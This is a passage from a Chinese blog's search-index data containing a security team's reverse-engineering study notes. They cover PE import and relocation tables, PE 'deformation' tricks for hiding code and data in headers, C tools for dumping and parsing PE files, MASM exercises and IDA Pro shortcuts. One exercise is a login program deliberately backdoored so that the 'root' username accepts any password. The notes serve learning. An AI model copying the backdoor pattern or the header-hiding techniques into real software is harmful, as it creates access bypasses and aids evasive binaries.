20191021093308 如果PE文件中有n个重定位项，重定位表的大小为2*n+4+4 VirtualAddress是重定位块RVA SizeOfBlock是该页面中重定位表的项数 重定位表的组织方式为页面1的IMAGE_BASE_RELOCATION后是页面1的重定位表现然后是页面2的IMAGE_BASE_RELOCATION 每个重定位表项大小为1个字节，每个字高4位说明此重定位项的类型，一般值只为0和3,0 代表无意义只作对齐用，3代表着双字32位都需要修正 20191021094428 所有的重定位块最终以一个VirtualAddress字段为0的IMAGE_BASE_RELOCATION结果作为结束","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://liuyi12138.github.io/categories/网络安全/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://liuyi12138.github.io/tags/逆向/"},{"name":"PE","slug":"PE","permalink":"https://liuyi12138.github.io/tags/PE/"}]},{"title":"PE导入表","slug":"PE导入表","date":"2019-10-15T08:15:36.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2019/10/15/PE导入表/","link":"","permalink":"https://liuyi12138.github.io/2019/10/15/PE导入表/","excerpt":"网安组新人任务Week2笔记","text":"网安组新人任务Week2笔记 导入表简介 Windows加载器在运行PE时会将导入表中声明的动态链接库一并加载到进程的地址空间，并修正指令代码中调用的函数地址 数据目录中有四种类型的数据与导入表数据有关: 导入表 导入函数地址表 绑定导入表 延迟加载导入表 导入函数对invoke指令的分解 压栈:将要调用的所有参数push到栈中，先push后用的参数 段内调用:通过call指令调用一个段内地址 无条件转移:call调用出的代码为无条件跳转指令，在该地址获取到导入函数在内存中的VA 导入函数地址 在PE文件装载进内存前，无条件转移的跳转地址处存放着调用的函数名和在动态链接库里的编号 在PE文件装载进内存时，加载器会根据函数名/编号从内存地址空间找到函数的VA，并将找到的函数地址重新覆盖内存中无条件转移的跳转地址处的数据 导入函数宿主 操作系统会将导入函数所在的动态链接库全部复制到地址空间，这些动态链接库就是导入函数的指令宿主 一般情况下动态链接库的装载基地址是固定的，这个地址由IMAGE_OPTIONAL_HEADER.ImageBase决定 20191015172328 PE中的导入表导入表定位 导入表描述信息位于数据目录第二项 IAT(Import Address Table 导入函数地址表)描述信息位于数据目录第13项 根据描述信息中的RVA计算出其在文件中的偏移地址即可定位导入表和导入函数地址表 导入表描述符 IAMGE_IMPORT_DESCRIPTOR 导入表数据的起始是一组导入表描述符结构，每组20字节 导入表描述符结构中Name1为0代表导入表结束，可由此计算出导入的动态链接库的个数 20191016151126 OriginalFirstThunk简称桥1，该结构为1个双字,指向一个包含一系列结构的数组，最后以一个内容为全0的结构作为结束。数组中的每一项为一个IMAGE_THUNK_DATA结构 双字的最高位为1，表示导入符号是一个名称 双字的最高位为0，表示导入符号是一个数值，该值是一个RVA NAME1是一个RVA，指向该结构所对应的DLL文件的名称，该名称以”\\0”结尾 FirstThunk简称桥2,与OriginalFirstThunk相同，它指向的链表定义了针对Name1这个动态链接库引入的所有导入函数 IMAGE_THUNK_DATA 20191016163342 IMAGE_IMPORT_BY_NAME 20191016205446 注意Union是为所有的数据仅留存一块公用空间 导入表的双桥结构 桥1和桥2都最终都指向引入函数的“编号-名称”(Hint/Name)描述部分 20191016162504 桥1和桥2包含有一个IMAGE_THUNK_DATA数组的RVA 数组中的每一个IMAGE_THUNK_DATA都包含有一个IMAGE_IMPORT_BY_NAME结构的RVA 桥1桥2指向的IAT和INT存储在不同的位置但存储的内容完全相同 导入函数地址表 在IAT中相同链接库的函数地址排列在一起，两个链接库的引入函数之前以一个双字的0分隔 当PE被加载进虚拟空间以后，IAT的内容会被修改为函数的VA，所以桥2发生断裂，如果没有桥1作为参照就无法重新找到该地址到底调用了哪个函数 绑定导入 绑定导入的目的是把由Windows家在程序负责的IAT地址导入修正工作提前到加载前进行 绑定目录项是数据目录的第12项 绑定导入数据的组织方式 20191020095141 绑定导入数据由一系列绑定导入描述符IMAGE_BOUND_IMPORT_DESCRIPTOR结构组成，每一个结构对应一个动态链接库 20191020094057 TimeDateStamp必须与要引用的DLL文件的文件头中的IMAGE_FILE_HEADER.TimeDateStamp保持一致，否则会促使加载器重新计算新的IAT OffsetModuleName包含以第一个IMAGE_BOUND_IMPORT_DESCRIPTOR作为基地址，DLL名称字符串的偏移量 NumberOfModuleForwarderRefs描述了紧接在IMAGE_BOUND_IMPORT_DESCRIPTOR结构后的另一个结构IMAGE_BOUND_FORWADRER_REF数组的元素个数 20191020094914 出于不同的目的(如代码更新、结构调整或实施补丁等),动态链接库中的某些函数的实现代码会被转移到别的动态链接库中。但为了提供向前的兼容，这些动态链接库中还保留了该函数的定义。 也就是说，一个导入函数将涉及对多动态链接库函数的调用，数据结构IMAGE_BOUND_FORWARDER_REF就是在这样一个背景下产生的，它将引入函数涉及的所有动态链接库都列举出来。该结构的字段定义和IMAGE_BOUND_IMPORT_DESCRIPTOR是基本一致的，所以前面的描述“绑定导入数据由一系列的绑定导入描述符IMAGE_BOUND_IMPORT_DESCRIPTOR的结构组成”也是成立的","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://liuyi12138.github.io/categories/网络安全/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://liuyi12138.github.io/tags/逆向/"},{"name":"PE","slug":"PE","permalink":"https://liuyi12138.github.io/tags/PE/"}]},{"title":"PE变形技术","slug":"PE变形技术","date":"2019-10-13T10:49:36.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2019/10/13/PE变形技术/","link":"","permalink":"https://liuyi12138.github.io/2019/10/13/PE变形技术/","excerpt":"网安组新人任务Week2笔记","text":"网安组新人任务Week2笔记 PE变形技术分类结构重叠技术 在不影响正常性能的前提下，将某些技术进行重叠 两个字段中数据发生了重叠但没有发生加载错误 被覆盖的数据可能在另一个结构中无用 有用的数据只对一个数据有用 当被覆盖的数据在两个结构中都有用时必须保证重叠部分数据一致 PE加载器不检测所有的字段 空间调整技术 通过调整IMAGE_DOS_HEADER.e_Ifanew的值实现动态地扩充或缩小DOS STUB块空间，从而达到PE变形的目的 复制从PE头开始的所有数据到指定位置 可能需要修改的值: IMAGE_DOS_HEADER.e_lfanew —— PE头相对偏移位置 IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint —— 程序执行入口 IMAGE_OPTIONAL_HEADER.SizeOfImage —— 内存中PE映像的尺寸 IMAGE_OPTIONAL_HEADER.SizeOfHeader —— 所有头+节表的大小 IMAGE_SECTION_HEADER.VirtualSIze —— 节区的尺寸 IMAGE_SECTION_HEADER.PointerToRawData —— 在文件中的偏移 数据转移技术 将PE中的一部分数据转移到另一个位置 将程序中的变量存储到文件头部结构的某个字段 将代码转移到头部结构的某个连续空间中 变量存储 可将.data中的变量存放在IMAGE_DOS_HEADER中，省去一个节表的内容 代码存储 可存到IMAGE_DOS_HEADER中或数据目录表中 如果空间不够也可将代码分开储存 数据压缩技术 先压缩代码，在PE头部找一块比较大的连续空间存放压缩用的代码，程序被PE加载器加载后，可通过头部解压程序将代码解压，解压后跳转到解压后的代码 变形技术可用的空间文件头部未用的字段 10.14.1 10.14.2 不连续的空间可用来存放数据 连续但字节数不多的空间可用来存放代码 相对较大的连续空间可用来存放较长的指令字节码 IMAGE_DOS_HEADER中的54个字节 标准头12个字节 扩展头14个字节 数据目录52个字节 每个节表项20个字节 大小不固定的数据块 DOS STUB 数据目录项 NumberOfRvaAndSizes修改数据目录项的项数 节表 SizeOfRawData修改节在文件对齐后的尺寸 若修改一个节的尺寸，后续节的起始地址也需要修改 因对齐产生的补足空间 主要可参考数据压缩技术将0压缩 PE文件变形原则 数据目录表的个数必须大于等于2 PE头文件中可以没有节的定义，但一定要将IMAGE_FILE_HEADER.NumberOfSections设置为1 节的对齐尺寸必须大于等于文件的对齐尺寸 20191014154208 20191014154409","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://liuyi12138.github.io/categories/网络安全/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://liuyi12138.github.io/tags/逆向/"},{"name":"PE","slug":"PE","permalink":"https://liuyi12138.github.io/tags/PE/"}]},{"title":"PE文件操作实践","slug":"PE文件操作实践","date":"2019-10-12T03:21:36.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2019/10/12/PE文件操作实践/","link":"","permalink":"https://liuyi12138.github.io/2019/10/12/PE文件操作实践/","excerpt":"网安组新人任务Week2实践内容","text":"网安组新人任务Week2实践内容 PEDump PE文件查看器 功能：可导出指定PE文件的十六进制字节码以及ASCII码 使用方法: PEDUMP.exe filename 在控制台输出PE文件内容并在同一目录下导出为report.txt code：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main(int argc, char* argv[])&#123; int address = 0; int ascii[16]; unsigned char buff[16]; //FILE *fpr = fopen(argv[1], \"r\"); //r 读到\\r\\n会改为\\n,读到\\x1a会返回EOF //rb 读到什么返回什么,读到文件末尾才会返回EOF FILE *fpr = fopen(argv[1], \"rb\"); FILE *fpw = fopen(\"report.txt\",\"w\"); if(fpr == NULL || fpw == NULL) &#123; printf(\"%s failed to open \\n\",argv[1]); return 1; &#125; printf(\" 地址 字节码内容 ASCII字符\\n\"); fprintf(fpw, \" 地址 字节码内容 ASCII字符\\n\"); //while(fgets(buff,sizeof(buff),fpr) != NULL)&#123; //此处应将fgets修正为fread，因为fgets每次读取完后会在字符串后补/0导致输出的文件出错，在后续PEINFO中发现了这个问题 while(fread(buff,1,sizeof(buff),fpr) != NULL)&#123; printf(\"%08x \", address); fprintf(fpw, \"%08x \", address); for(int i = 0; i &lt; 16; ++i)&#123; ascii[i] = buff[i]; printf(\"%02X\",buff[i]); fprintf(fpw, \"%02X\",buff[i]); if(i == 7)&#123; printf(\" - \"); fprintf(fpw, \" - \"); &#125; else&#123; printf(\" \"); fprintf(fpw, \" \"); &#125; &#125; printf(\" \"); fprintf(fpw, \" \"); for(int i = 0; i &lt; 16; ++i)&#123; if(ascii[i] &gt; 37 &amp;&amp; ascii[i] &lt; 127)&#123; printf(\"%c\",ascii[i]); fprintf(fpw, \"%c\",ascii[i]); &#125; else&#123; printf(\".\"); fprintf(fpw,\".\"); &#125; &#125; address += 16; printf(\"\\n\"); fprintf(fpw, \"\\n\"); &#125; fclose(fpr); fclose(fpw); return 0;&#125; PEINFO PE文件结构查看器 功能：可查看PE文件的具体结构 使用方法: PEINFO.exe filename 在控制台输出PE文件的具体结构 10.19更新 增加获取导入表信息部分 code：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;Windows.h&gt;IMAGE_DOS_HEADER myDosHeader;IMAGE_NT_HEADERS myNTHeader;IMAGE_OPTIONAL_HEADER myOptionHeader;IMAGE_SECTION_HEADER* pmySectionHeader;LONG e_lfanew;IMAGE_IMPORT_DESCRIPTOR* pmyImportDes;void getValueByOffset(FILE* fp,DWORD offset, char* value, int size);int main(int argc, char* argv[])&#123; int i = 0; printf(\"File Name: %s\\n\",argv[1]); FILE *fp = fopen(argv[1], \"rb\"); if(fp == NULL) &#123; printf(\"failed to open \\n\"); return 1; &#125; //DOS头部分 printf(\"====================IMAGE_DOS_HEADER====================\\n\"); fread(&amp;myDosHeader,1 ,sizeof(IMAGE_DOS_HEADER), fp); if (myDosHeader.e_magic!=0x5A4D) &#123; printf(\"not Exe File!\"); fclose(fp); return 1; &#125; printf(\"MZ标识(WORD) e_magic: %04X\\n\", myDosHeader.e_magic); printf(\"PE偏移量(DOWRD) e_lfaner: %08X\\n\\n\", myDosHeader.e_lfanew); e_lfanew = myDosHeader.e_lfanew; //NT头部分 printf(\"====================IMAGE_NT_HEADER====================\\n\"); fseek(fp, e_lfanew, SEEK_SET); fread(&amp;myNTHeader, 1, sizeof(IMAGE_NT_HEADERS), fp); if (myNTHeader.Signature != 0x4550) &#123; printf(\"not PE File!\"); fclose(fp); exit(0); &#125; printf(\"PE标识(DWORD) Signature: %08X\\n\\n\",myNTHeader.Signature); //FILE头部分 printf(\"===================IMAGE_FILE_HEADER====================\\n\"); printf(\"运行平台(WORD) Machine: %04X\\n\", myNTHeader.FileHeader.Machine); printf(\"节的数量(WORD) NumberOfSection: %d\\n\", myNTHeader.FileHeader.NumberOfSections); printf(\"文件属性(WORD) Characteristics: %04X\\n\\n\", myNTHeader.FileHeader.Characteristics); //OPTIONAL头部分 printf(\"==================IMAGE_OPTION_HEADER===================\\n\"); printf(\"程序执行入口(DWORD) AddressOfEntryPoint: %08X\\n\", myNTHeader.OptionalHeader.AddressOfEntryPoint); printf(\"代码节起始点(DWORD) BaseOfCode: %08X\\n\", myNTHeader.OptionalHeader.BaseOfCode); printf(\"数据节起始点(DWORD) BaseOfData: %08X\\n\", myNTHeader.OptionalHeader.BaseOfData); printf(\"建议装入基地址(DWORD) ImageBase: %08X\\n\", myNTHeader.OptionalHeader.ImageBase); printf(\"数据目录数量(DWORD) NumberOfRvaAndSizes: %d\\n\\n\", myNTHeader.OptionalHeader.NumberOfRvaAndSizes); //数据目录 DWORD IAT_RVA = 0; //IAT的RVA DWORD ImportDir_RVA = 0; //导入表的RVA DWORD IAT_offset = 0; //由IAT的RVA计算出的文件偏移地址 DWORD ImportDir_offset = 0; //由导入表的RVA计算出的文件偏移地址 DWORD IAT_Section_RVA = 0; //IAT所在的节的RVA DWORD IAT_Section_offset = 0; //IAT所在的节的文件偏移 DWORD ImportDir_Section_RVA = 0; //导入表所在的节的RVA printf(\"==================IMAGE_DATA_DIRECTORY==================\\n\"); //数据目录 for(i = 0; i &lt; myNTHeader.OptionalHeader.NumberOfRvaAndSizes; ++i)&#123; if(myNTHeader.OptionalHeader.DataDirectory[i].VirtualAddress != 0)&#123; if(i == 1)&#123; ImportDir_RVA = myNTHeader.OptionalHeader.DataDirectory[i].VirtualAddress; &#125; if(i == 12)&#123; IAT_RVA = myNTHeader.OptionalHeader.DataDirectory[i].VirtualAddress; &#125; printf(\"数据块%d:\\n\", i+1); printf(\"数据起始点(DWORD) VirtualAddress: %08X\\n\",myNTHeader.OptionalHeader.DataDirectory[i].VirtualAddress); printf(\"数据块长度(DWORD) Size: %08X\\n\\n\",myNTHeader.OptionalHeader.DataDirectory[i].Size); &#125; &#125; //节表目录 printf(\"==================IMAGE_SECTION_HEADER==================\\n\"); pmySectionHeader = (IMAGE_SECTION_HEADER*)malloc(myNTHeader.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER)); fseek(fp, (e_lfanew + sizeof(IMAGE_NT_HEADERS)), SEEK_SET); fread(pmySectionHeader, sizeof(IMAGE_SECTION_HEADER), myNTHeader.FileHeader.NumberOfSections, fp); printf(\"节的属性参考:\\n\"); printf(\" 00000020h 包含代码\\n\"); printf(\" 00000040h 包含已初始化的数据，如.const\\n\"); printf(\" 00000080h 包含未初始化的数据，如.data?\\n\"); printf(\" 02000000h 数据在进程开始以后被丢弃，如.reloc\\n\"); printf(\" 04000000h 节中数据不经过缓存\\n\"); printf(\" 08000000h 节中数据不会被交换到硬盘\\n\"); printf(\" 10000000h 数据将被不同进程共享\\n\"); printf(\" 20000000h 可执行\\n\"); printf(\" 40000000h 可读\\n\"); printf(\" 80000000h 可写\\n\\n\"); printf(\"内存中节的对齐粒度(DWORD) SectionAlignment: %08X\\n\",myNTHeader.OptionalHeader.SectionAlignment); printf(\"文件中节的对齐粒度(DWORD) FileAlignment: %08X\\n\\n\",myNTHeader.OptionalHeader.FileAlignment); for(i = 0; i &lt; myNTHeader.FileHeader.NumberOfSections; i++,pmySectionHeader++)&#123; //获取IAT和导入表所在的节的信息 if(ImportDir_RVA != 0 &amp;&amp; IAT_RVA != 0)&#123; if(pmySectionHeader-&gt;VirtualAddress &lt;= IAT_RVA &amp;&amp; pmySectionHeader-&gt;VirtualAddress + pmySectionHeader-&gt;Misc.VirtualSize &gt; IAT_RVA)&#123; IAT_offset = pmySectionHeader-&gt;PointerToRawData + (IAT_RVA - pmySectionHeader-&gt;VirtualAddress); IAT_Section_RVA = pmySectionHeader-&gt;VirtualAddress; IAT_Section_offset = pmySectionHeader-&gt;PointerToRawData; &#125; if(pmySectionHeader-&gt;VirtualAddress &lt;= ImportDir_RVA &amp;&amp; pmySectionHeader-&gt;VirtualAddress + pmySectionHeader-&gt;Misc.VirtualSize &gt; ImportDir_RVA)&#123; ImportDir_offset = pmySectionHeader-&gt;PointerToRawData + (ImportDir_RVA - pmySectionHeader-&gt;VirtualAddress); ImportDir_Section_RVA = pmySectionHeader-&gt;VirtualAddress; &#125; &#125; printf(\"节区%d:\\n\", i); printf(\"节的名称(BYTE) NAME: %s\\n\",pmySectionHeader-&gt;Name); printf(\"未对齐前真实长度(DWORD) VirtualSize: %08X\\n\",pmySectionHeader-&gt;Misc.VirtualSize); printf(\"节的RVA(DWORD) VirtualAddress: %08X\\n\",pmySectionHeader-&gt;VirtualAddress); printf(\"文件中对齐后长度(DWORD) SizeOfRawData: %08X\\n\",pmySectionHeader-&gt;SizeOfRawData); printf(\"在文件中的偏移(DWORD) PointerToRawData: %08X\\n\",pmySectionHeader-&gt;PointerToRawData); printf(\"节的属性(DWORD) Characteristics: %08X\\n\\n\",pmySectionHeader-&gt;Characteristics); &#125; printf(\"========================================================\\n\\n\"); if(ImportDir_offset != 0)&#123; int count = 0; //导入表中库的数量计数 int count1 = 0; //某导入库中函数数量计数 while(1)&#123; pmyImportDes = (IMAGE_IMPORT_DESCRIPTOR*)malloc(sizeof(IMAGE_IMPORT_DESCRIPTOR)); getValueByOffset(fp, ImportDir_offset + sizeof(IMAGE_IMPORT_DESCRIPTOR) * count, pmyImportDes, sizeof(IMAGE_IMPORT_DESCRIPTOR)); count++; if(pmyImportDes-&gt;Name == 0) break; else&#123; //获取导入库名 DWORD name_offset = (pmyImportDes-&gt;Name - IAT_Section_RVA) + IAT_Section_offset; char name[32]; getValueByOffset(fp, name_offset, name, 32); printf(\"导入库: %s\\n\", name); printf(\"-------------------------------\\n\"); printf(\"OriginalFirstThunk %08X\\n\", pmyImportDes-&gt;OriginalFirstThunk); printf(\"TimeDateStamp %08X\\n\", pmyImportDes-&gt;TimeDateStamp); printf(\"ForwarderChain %08X\\n\", pmyImportDes-&gt;ForwarderChain); printf(\"NameRva %08X\\n\", pmyImportDes-&gt;Name); printf(\"NameOffest %08X\\n\", name_offset); printf(\"FirstThunk %08X\\n\", pmyImportDes-&gt;FirstThunk); //定位到IMAGE_THUNK_DATA if(pmyImportDes-&gt;OriginalFirstThunk &lt; 0x10000000)&#123; count1 = 0; printf(\"-------------------------------\\n\"); //循环获取单个IMAGE_THUNK_DATA while(1)&#123; DWORD* pmyThunkData; pmyThunkData = (DWORD*)malloc(sizeof(DWORD)); DWORD thunk_offset = (pmyImportDes-&gt;OriginalFirstThunk - IAT_Section_RVA) + IAT_Section_offset; getValueByOffset(fp, thunk_offset + sizeof(DWORD) * count1, pmyThunkData, sizeof(DWORD)); count1++; if((*pmyThunkData) == 0) break; else&#123; //获取Hint_Name_offset结构 DWORD Hint_Name_offset = (*pmyThunkData - IAT_Section_RVA) + IAT_Section_offset; IMAGE_IMPORT_BY_NAME* pmyImportByName; pmyImportByName = (IMAGE_IMPORT_BY_NAME*)malloc(320); getValueByOffset(fp, Hint_Name_offset, pmyImportByName, 320); printf(\"%08X %s\\n\", pmyImportByName-&gt;Hint,pmyImportByName-&gt;Name); &#125; &#125; printf(\"\\n\"); &#125; &#125; free(pmyImportDes); &#125; &#125; fclose(fp); return 0;&#125;//通过在文件中的偏移获取数据void getValueByOffset(FILE* fp,DWORD offset, char* value, int size)&#123; long int position = ftell(fp); fseek(fp, offset,SEEK_SET); fread(value, sizeof(char),size,fp); fseek(fp, position,SEEK_SET);&#125;","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://liuyi12138.github.io/categories/网络安全/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://liuyi12138.github.io/tags/逆向/"},{"name":"PE","slug":"PE","permalink":"https://liuyi12138.github.io/tags/PE/"}]},{"title":"PE初识","slug":"PE初识","date":"2019-10-11T06:51:36.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2019/10/11/PE初识/","link":"","permalink":"https://liuyi12138.github.io/2019/10/11/PE初识/","excerpt":"网安组新人任务Week2笔记","text":"网安组新人任务Week2笔记 一些基本概念地址 虚拟内存地址(VA) 虚拟内存大小为4GB 虚拟内存地址 = 进程的基地址 + 相对虚拟内存地址 相对虚拟内存地址(RVA) RVA是针对某个模块而存在的 文件偏移地址(FOA) FOA与内存无关，是指某个位置距离文件头的偏移 特殊地址 特殊地址从某个特定位置开始 指针 某数据结构中某个字段存储的值为一个地址，则这个字段就是一个指针 数据目录 记录所以可能的数据类型 目前已定义15种(各种表) 节 节用来存放不同类型的数据 不同节具有不同的访问权限 节是PE文件中存放代码和数据的基本单元，一个节的所有原始数据必须被加载到连续的内存空间 对齐 数据在内存中对齐 节在内存中的对齐单位必须至少是一个页的大小 32位系统为4KB，64位系统为8KB 数据在文件中对齐 以一个物理扇区的大小作为对齐粒度的值(512字节) 一般PE在内存中的尺寸大于在文件中的尺寸 资源文件中资源数据对齐 以双字(4个字节)对齐 PE文件结构16位系统下的PE结构 主要分为DOS头和冗余数据两个部分 10.11.2 DOS MZ头 DOS MZ头部分的内容在源程序中是找不到相对于的语句的，其字节码的添加是由链接程序自动实现的 DOS MZ头大小为64字节 DOS Stub大小不固定导致 DOS Stub是该程序在DOS系统下运行的指令字节码 DOS Stub的大小不固定 PE头和PE数据区在16位系统下是冗余数据，不会程序执行造成影响 32位系统下的PE结构 在32位系统中与16位系统刚好相反，DOS头部分都是冗余数据 定位标准PE头 由于DOS Stub大小不固定导致DOS头大小不固定 字段e_Ifanew为标准PE头的相对偏移量 PE_start = DOS MZ基地址 + IMAGE_DOS_HEADER.e_lfanew PE文件结构 10.11.3 一般PE头大小为456字节(数据目录表项是16个的情况下)，该结构的大小由IMAGE_FILE_HEADER.SizeOfOptionalHeader来确定 每个PE中节的数量不固定所以节表大小不固定，每个节的描述信息为40字节,节的数量由IMAGE_FILE_HEADER.NumberOfSections来定义 节内容如同DOS STub一样大小不固定 具体的PE结构 10.11.5 PE头包含： 4字节的标识符号(Signature) 20字节的基本头信息(IMAGE_FILE_HEADER) 216字节的扩展头信息(IMAGE_OPTIONAL_HEADER32) PE文件头部解析DOS MZ头IMAGE_DOS_HEADER 10.11.6 PE头标识Signature 内容固定，对应的ASCII码的字符串为&quot;PE\\0\\0&quot; 标准PE头IMAGE_FILE_HEADER 10.11.7 扩展PE头IMAGE_OPTIONAL_HEADER32 10.11.13 10.11.9 广义PE头IMAGE_NT_HEADERS 广义上的PE头，是PE部分三个数据结构的组合 10.11.10 数据目录项 IMAGE_DATA_DIRECTORY 扩展PE头的最后一个字段DataDirectoty定义了PE文件中出现的所有不同类型的数据的目录信息 每一种数据类型按照如下数据结构存放 10.11.11 该数据结构中偏移量是基于IMAGE_NT_HEADERS头的 节表项 IMAGE_SECTION_HEADER 节表由很多节表项组成 节表项的数量由IMAGE_FILE_HEADER.NumberOfSections来定义 10.11.12 该数据结构中的偏移量是基于IMAGE_SECTION_HEADER头的 数据结构字段解析PE头IMAGE_NT_HEADER字段 IMAGE_NT_HEADER.Signature 偏移地址 +0000h PE文件标识，被定义为00004550h,即”PE\\0\\0” IMAGE_NT_HEADER.FileHeader 偏移地址 +0004h 该结构指向IMAGE_FILE_HEADER 被称为标准COFF头 IMAGE_NT_HEADER.OptionalHeader 偏移地址 +0018h 该结构指向IMAGE_OPTIONAL_HEADER32 是操作系统映像文件独有的头部信息，”.obj”目标文件中没有 前10个字段原属于COFF，用来加载和运行一个可执行文件，后21个字段是通过连接器追加的扩展部分","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://liuyi12138.github.io/categories/网络安全/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://liuyi12138.github.io/tags/逆向/"},{"name":"PE","slug":"PE","permalink":"https://liuyi12138.github.io/tags/PE/"}]},{"title":"Win32汇编实践","slug":"Win32汇编实践","date":"2019-10-09T07:54:36.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2019/10/09/Win32汇编实践/","link":"","permalink":"https://liuyi12138.github.io/2019/10/09/Win32汇编实践/","excerpt":"网安组新人任务Week1实践内容","text":"网安组新人任务Week1实践内容 helloWorld 任务需求：用win32汇编写出一个弹窗HelloWorld 代码编写:1234567891011121314151617181920212223242526272829;.386是伪指令 告诉编译器使用 386指令集.386;.model 内存模式[,语言模式][,其它模式];flat 是win32程序使用的模式，代码和数据段使用同一个4GB段;stdcall 是函数调用约定，参数从右往左压栈.model flat,stdcall;大小写敏感option casemap:none;包含和应用的库文件include windows.incinclude user32.incincludelib user32.libinclude kernel32.incincludelib kernel32.lib;数据段.dataszCaption db &apos;Dian团队网安组&apos;, 0szText db &apos;Hello,World !&apos;, 0;代码段.codestart: invoke MessageBox,NULL,offset szText,offset szCaption,MB_OK invoke ExitProcess,NULLend start 编译与链接 编译：ml /c /coff helloWorld.asm /c Assemble without linking 表示只编译不连接 /coff generate COFF format object file 生成COFF格式的目标文件 链接 link /subsystem:windows helloWorld.obj窗口类型的程序 link /subsystem:console helloWorld.obj控制台类型程序 login 任务需求：用win32汇编写出一个控制台程序，请求用户输入用户名和密码，当用户名为root时无论密码为什么都能登录成功，当用户名为其他的时候，密码为另一个固定的密码时才能登录 代码编写:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162;.386是伪指令 告诉编译器使用 386指令集.386;.model 内存模式[,语言模式][,其它模式];flat 是win32程序使用的模式，代码和数据段使用同一个4GB段;stdcall 是函数调用约定，参数从右往左压栈.model flat,stdcall;大小写敏感option casemap:none;包含和应用的库文件include windows.incinclude user32.incincludelib user32.libinclude kernel32.incincludelib kernel32.libinclude masm32.incincludelib masm32.lib;数据段.datacolHello db &apos;Dian团队网安组登录测试&apos;, 0Ah,0colAccount db &apos;please input the account&apos;,0Ah,0colPassword db &apos;please input the password&apos;,0Ah,0colOk db &apos;login success !&apos;,0Ah,0colWrong db &apos;password wrong !&apos;,0Ah,0len equ 8root db &apos;root&apos;,0truePassword db &apos;diangroup&apos;,0account db ?password db ?;代码段.codestart: invoke StdOut, addr colHello invoke StdOut, addr colAccount invoke StdIn, addr account,len invoke StdOut, addr colPassword invoke StdIn, addr password,len movsx AX, account movsx BX, root cmp AX,BX jz @ok movsx AX, password movsx BX, truePassword cmp AX,BX jz @ok invoke StdOut, addr colWrong jmp @end @ok: invoke StdOut, addr colOk @end: invoke ExitProcess, 0end start decrypt 尝试反编译该程序找出解密密码 C语言代码编写:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main()&#123; char* code = &quot;Welcome to Dian !&quot;; int len = strlen(code); char password[128]; char key[128]; char value[128] = &#123;&#125;; char decode_value[128] = &#123;&#125;; printf(&quot;please input the password\\n&quot;); scanf(&quot;%s&quot;,password); getchar(); if(strcmp(password,&quot;Diangroup709&quot;) == 0)&#123; for(int j = 0; j &lt; len; ++j) value[j] = code[j] ^ code[len - j - 1]; printf(&quot;%s\\n&quot;,value); FILE *fp =fopen(&quot;D:\\\\dian&quot;,&quot;w&quot;); if(fp == NULL) &#123; return 0; &#125; fprintf(fp ,&quot;%s&quot;,value); fclose(fp); printf(&quot;please input the key to decrypt the file\\n&quot;); gets(key); for(int j = 0; j &lt; len; ++j)&#123; if(strlen(key) &gt; j)&#123; decode_value[j] = value[j] ^ key[j]; &#125; &#125; FILE *fp1 =fopen(&quot;D:\\\\dian&quot;,&quot;w&quot;); if(fp1 == NULL) &#123; return 0; &#125; fprintf(fp1 ,&quot;%s&quot;,decode_value); fclose(fp1); &#125; else&#123; printf(&quot;wrong\\n&quot;); &#125; return 0;&#125;","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://liuyi12138.github.io/categories/网络安全/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://liuyi12138.github.io/tags/逆向/"},{"name":"汇编","slug":"汇编","permalink":"https://liuyi12138.github.io/tags/汇编/"}]},{"title":"静态调试&动态调试学习笔记","slug":"静态调试&动态调试学习笔记","date":"2019-09-29T02:43:36.000Z","updated":"2021-02-23T06:34:31.941Z","comments":true,"path":"2019/09/29/静态调试&动态调试学习笔记/","link":"","permalink":"https://liuyi12138.github.io/2019/09/29/静态调试&动态调试学习笔记/","excerpt":"网安组新人任务Week1笔记","text":"网安组新人任务Week1笔记 IDA Pro 静态调试 字符串搜索：Alt+T 搜索下一个：Ctrl+T 反汇编为C代码：F5 修改命令：ALT+F212345678910111213141516171819202122232425262728293031a：将数据转换为字符串f5：一键反汇编esc：回退键，能够倒回上一部操作的视图（只有在反汇编窗口才是这个作用，如果是在其他窗口按下esc，会关闭该窗口）shift+f12：可以打开string窗口，一键找出所有的字符串，右击setup，还能对窗口的属性进行设置ctrl+w：保存ida数据库ctrl+s：选择某个数据段，直接进行跳转ctrl+鼠标滚轮：能够调节流程视图的大小x：对着某个函数、变量按该快捷键，可以查看它的交叉引用g：直接跳转到某个地址n：更改变量的名称y：更改变量的类型/ ：在反编译后伪代码的界面中写下注释\\：在反编译后伪代码的界面中隐藏/显示变量和函数的类型描述，有时候变量特别多的时候隐藏掉类型描述看起来会轻松很多；：在反汇编后的界面中写下注释ctrl+shift+w：拍摄IDA快照u：undefine，取消定义函数、代码、数据的定义 解除passwd的限制 执行程序发现程序会打印提示信息 